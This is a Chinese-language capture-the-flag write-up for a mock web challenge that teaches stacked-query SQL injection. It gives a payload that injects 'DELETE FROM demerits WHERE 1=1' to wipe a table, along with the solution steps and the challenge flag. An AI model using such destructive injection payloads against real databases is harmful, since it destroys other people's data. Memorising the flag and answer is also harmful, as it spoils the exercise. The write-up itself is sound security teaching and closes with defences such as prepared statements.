# ✅ Web-47 解題說明 — Stacked Query 刪除紀錄

## 題目描述
此題的前端會把 `filterName` 直接拼進 SQL：

```sql
SELECT * FROM demerits WHERE name LIKE '%<user_input>%'
```

後端又允許同一個請求執行多段 SQL（stacked queries），因此可在同一條 payload 中同時做到：
1. 查詢
2. 刪除
3. 再查詢

目標是清空 `demerits` 表，觸發結果回傳中的旗標。

## 難度
★★★★☆（4星）

## 種類
WEB, SQL

## 建議工具
- 瀏覽器
- DevTools Console（觀察 `Final SQL` / `SQL Error`）
- SQL Injection 基礎

## 解題步驟
1. 開啟 `https://llcmhlau.edu.hk/mockCTF/Web-47`。
2. 在 `filterName` 輸入以下 payload：

```text
A%'; DELETE FROM demerits WHERE 1=1; SELECT * FROM demerits -- 
```

3. 按「刷新表格」。
4. 伺服器執行時，會把 SQL 切成多段，概念上如下：

```sql
SELECT * FROM demerits WHERE name LIKE '%A%';
DELETE FROM demerits WHERE 1=1;
SELECT * FROM demerits -- %'
```

5. 第二段 `DELETE` 會清空資料表。
6. 後端檢查到 `demerits` 筆數為 0，回傳結果中的 `result`（旗標），前端會 `alert` 顯示。

## 為什麼這題可以堆疊
- 後端不是固定執行單一查詢，而是把收到的字串用 `;` 切開逐段執行。
- 前端又直接把輸入拼進 SQL 字串，造成可以先關閉原字串，再接下一段指令。
- 這就是典型 stacked query injection 教學情境。

## 驗證與常見卡點
- 驗證方式：
  - 表格變空。
  - 跳出旗標：`flag{y0u_succ3ssfully_d3m3rits_r3cords}`。
- 常見卡點：使用了全形/智慧引號（例如 `’`）而不是 ASCII 單引號（`'`）。
- 常見卡點：寫成 `DELETE * FROM ...`（錯誤語法）；正確是 `DELETE FROM ...`。
- 常見卡點：`--` 後面沒有空白，導致註解未生效。
- 常見卡點：忽略 payload 後方仍會被模板補上 `%` 與 `'`，所以需要用註解吃掉尾巴。

## 學習重點
- 若後端允許任意 SQL 且支援多語句，攻擊面會從「讀取資料」升級到「直接改寫/刪除資料」。
- 前端黑名單或字串替換無法可靠防注入。
- 正確防禦：固定 API 行為 + prepared statements + 禁止任意 SQL 執行。

## Flag
`flag{y0u_succ3ssfully_d3m3rits_r3cords}`
